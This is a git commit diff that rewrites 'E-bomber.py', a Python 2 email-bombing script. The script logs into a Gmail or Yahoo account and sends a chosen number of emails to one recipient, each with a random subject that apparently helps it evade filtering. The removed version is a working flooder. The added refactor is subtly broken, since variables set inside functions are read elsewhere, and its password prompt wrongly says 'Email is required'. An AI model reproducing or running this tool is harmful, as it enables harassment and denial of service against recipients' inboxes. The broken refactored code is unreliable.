5a104fac6708a2163665d2a112ba16795752bab1
Craigo123 <35889173+Craigo123@users.noreply.github.com>
2018-01-28 14:02:07 +0000

    Update E-bomber.py

--- E-bomber.py
+++ E-bomber.py
@@ -1,65 +1,98 @@
-#!/usr/bin/python
-#E-bomber 
-#This code for education purpose only.
-#Use it at your own risk !!!
-
-# ==========================================================
-# IF YOU CANT LOGIN WITH GMAIL 
-# GMAIL COULD BE BLOCKING THE LOGIN
-# TO FIX YOU NEED TO TURN LESS SECURE APPS ON
-# USE THIS LINK TO CHANGE THE SETTING 
-# https://myaccount.google.com/lesssecureapps
-# ==========================================================
-
 import os
 import smtplib
 import getpass
-import sys                                                       
-print(chr(27) + "[2J")
-print '======================='
-print '      E-bomber.py      '
-print '      BY Craigo123     '
-print 'Use it at your own risk'
-print '======================='
-print ''
-server = raw_input ('MailServer Gmail/Yahoo: ')
-user = raw_input('Email: ')
-passwd = getpass.getpass('Password: ')
-
-to = raw_input('\nTo: ')
-#subject = raw_input('Subject: ') 
-body = raw_input('Message: ')
-total = input('Number of send: ')
-
-if server == 'gmail':
-    smtp_server = 'smtp.gmail.com'
-    port = 587
-elif server == 'yahoo':
-    smtp_server = 'smtp.mail.yahoo.com'
-    port = 25
-else:
-    print 'Applies only to gmail and yahoo.'
-    sys.exit()
-
-print ''
-
+import time
+import sys
 try:
-    server = smtplib.SMTP(smtp_server,port) 
-    server.ehlo()
-    if smtp_server == "smtp.gmail.com":
-            server.starttls()
-    server.login(user,passwd)
-    for i in range(1, total+1):
-        subject = os.urandom(9)
-        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
-        server.sendmail(user,to,msg)
-        print "\rE-mails sent: %i" % i
-        sys.stdout.flush()
-    server.quit()
-    print '\n Done !!!'
+	def MailServer():
+		server = raw_input ('MailServer Gmail/Yahoo: ')
+		if server == 'gmail':
+			smtp_server = 'smtp.gmail.com'
+			port = 587
+		elif server == 'yahoo':
+			smtp_server = 'smtp.mail.yahoo.com'
+			port = 25
+		else:
+			print '[!] Applies only to gmail and yahoo.'
+			MailServer()
+
+	def Getuser():
+		user = raw_input('Email: ')
+		if user == "":
+			print 'Email is required'
+			Getuser()
+		Getpasswd()
+	def Getpasswd():
+		passwd = getpass.getpass('Password: ')
+		if passwd == "":
+			print 'Email is required'
+			Getpasswd()
+		Login()
+	def Login():
+		print '[i] Testing Account' 
+		try:
+			server = smtplib.SMTP(smtp_server,port) 
+			server.ehlo()
+			server.starttls()
+			server.login(user,passwd)
+		
+			server.quit()
+			print '[i] Test passed'
+		except smtplib.SMTPAuthenticationError:
+			print '\n[!] The username or password you entered is incorrect.'
+			sys.exit()
+		except KeyboardInterrupt:
+			print '[-] Canceled'
+			sys.exit()
+
+	def email():
+		try:
+			server = smtplib.SMTP(smtp_server,port) 
+			server.ehlo()
+			if smtp_server == "smtp.gmail.com":
+					server.starttls()
+			server.login(user,passwd)
+			for i in range(1, total+1):
+				subject = os.urandom(9)
+				msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
+				server.sendmail(user,to,msg)
+				print "\rE-mails sent: %i" % i
+				sys.stdout.flush()
+			server.quit()
+			print '\n Done !!!'
+		except KeyboardInterrupt:
+			print '[-] Canceled'
+			sys.exit()
+		except smtplib.SMTPAuthenticationError:
+			print '\n[!] The username or password you entered is incorrect.'
+			sys.exit()
+		except smtplib.SMTPServerDisconnected:
+			print '\n[!] Server disconnected'
+			print '[!] Reconnecting in 5 seconds'
+			time.sleep(5)   # delays for 5 seconds. You can Also Use Float Value.
+			print '[!] Attempting to reconnect'
+		except smtplib.SMTPDataError:
+			print '[!] smtplib.SMTPDataError:'
+			print '[!] The SMTP server refused to accept the message data'
+			print '[!] Or daily user sending quota exceeded'
+		
+	print '======================='
+	print '    E-bomber.py    '
+	print '     BY Craigo123     '
+	print 'Use it at your own risk'
+	print '======================='
+	print ''
+	MailServer()
+
+	Getuser()
+
+	print ''
+
+	to = raw_input('\nTo: ')
+	#subject = raw_input('Subject: ') 
+	body = raw_input('Message: ')
+	total = input('Number of send: ')
+	email()
 except KeyboardInterrupt:
-    print '[-] Canceled'
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print '\n[!] The username or password you entered is incorrect.'
-    sys.exit()
+			print '[-] Canceled'
+			sys.exit()
